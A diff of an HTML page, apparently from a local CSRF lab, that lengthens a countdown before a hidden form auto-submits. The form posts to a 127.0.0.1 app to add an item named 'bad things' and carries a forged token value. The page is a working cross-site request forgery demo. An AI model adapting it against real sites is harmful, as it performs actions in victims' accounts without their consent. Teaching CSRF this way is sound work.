@@ -8,14 +8,14 @@
     <body>
         <p><a href="index.html" title="Menu">Back to menu</a><br /></p>
         <p>
-        POST HTTP "invisible" request in <span id="timer">3</span> seconds:</p>
+        POST HTTP "invisible" request in <span id="timer">5</span> seconds:</p>
         <form name="hackForm" method="POST" action="http://127.0.0.1:8080/?p=interests&action=add">
             <input type="hidden" name="name" value="bad things" />
             <input type="hidden" name="description" value="" />
             <input type="hidden" name="csrf_token" value="token$signed_token" />
         </form>
         <script type="text/javascript">
-            var timer = 3; // 3 seconds
+            var timer = 5; // 5 seconds
             var updateId = setInterval(function() {
                 timer--; // remove 1 second
                 document.getElementById("timer").innerHTML = timer; // update HTML
@@ -23,7 +23,7 @@
             setTimeout(function() {
                 clearInterval(updateId); // remove HTML update
                 document.hackForm.submit(); // submit form
-            }, 3000);
+            }, 5000);
         </script>
         <br />
         <br />
